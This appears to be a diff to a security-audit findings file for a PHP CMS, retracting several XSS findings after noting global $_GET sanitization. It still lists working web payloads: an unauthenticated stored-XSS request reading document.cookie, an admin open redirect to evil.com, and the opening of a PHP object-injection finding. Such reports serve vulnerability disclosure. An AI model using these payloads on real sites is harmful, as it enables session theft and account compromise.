@@ -2,6 +2,8 @@
 
 `TARGET` = host. `KEY` = the logged-in admin's `__c` token (copy it from any admin URL). Frontend params are prefixed `cntnt01`, admin params `m1_`.
 
+> **Input note:** `lib/include.php:74-90` globally sanitizes **`$_GET`** and `$_SERVER` only (strips `<...>` tags, encodes `'`/`"`). It does **not** touch `$_POST` or `$_REQUEST` — and module `$params` come from `$_REQUEST` via `GetModuleParameters`, so `mact` module params stay raw even on GET. Findings that read a payload straight from `$_GET` (retracted #3/#4, and #2's title) cannot carry tags/quotes; everything driven by POST body or `mact` params is unaffected.
+
 ---
 
 **1. News fesubmit — stored XSS (unauthenticated)**
@@ -9,18 +11,16 @@
 - Data: `cntnt01submit=1&cntnt01title=x&cntnt01content=<img src=x onerror=alert(document.cookie)>`
 - Req: News "Allow Front End Submission" on; article published/approved to fire. No login.
 
-**2. Bookmarks — stored XSS + open redirect**
-- URL: `https://TARGET/admin/makebookmark.php?__c=KEY&title=<img src=x onerror=alert(1)>&ref=ZXZpbC5jb20=` then view `https://TARGET/admin/listbookmarks.php?__c=KEY`
-- Data: (in URL) `title=<img ...>`, `ref=` base64 of `evil.com`
-- Req: valid admin session (own KEY) — self-XSS.
+**2. Bookmarks — open redirect** (stored-XSS part RETRACTED: `title` is `$_GET`, globally sanitized)
+- URL: `https://TARGET/admin/makebookmark.php?__c=KEY&ref=ZXZpbC5jb20=` → redirects to `//evil.com`
+- Data: `ref=` base64 of `evil.com`
+- Req: valid admin session (own KEY).
 
-**3. MicroTiny filepicker — reflected XSS**
-- URL: `https://TARGET/admin/moduleinterface.php?mact=MicroTiny,m1_,filepicker,0&__c=KEY&showtemplate=false&field=x';alert(document.cookie);//`
-- Req: admin login + KEY.
+**3. MicroTiny filepicker — reflected XSS — ❌ RETRACTED (invalid)**
+- Reason: `field`/`subdir` come from `$_GET`, globally sanitized in `lib/include.php:74-90` (tags stripped, quotes encoded). Payload cannot fire.
 
-**4. eventhandlers.php — reflected XSS**
-- URL: `https://TARGET/admin/eventhandlers.php?__c=KEY&action=showeventhelp&module=Core&event=<script>alert(document.cookie)</script>`
-- Req: admin login + KEY.
+**4. eventhandlers.php — reflected XSS — ❌ RETRACTED (invalid)**
+- Reason: `event`/`module` come from `$_GET`, globally sanitized (same as #3). HTML renders as inert text.
 
 **5. CMSContentManager — PHP object injection**
 - URL: `POST https://TARGET/admin/moduleinterface.php?__c=KEY`
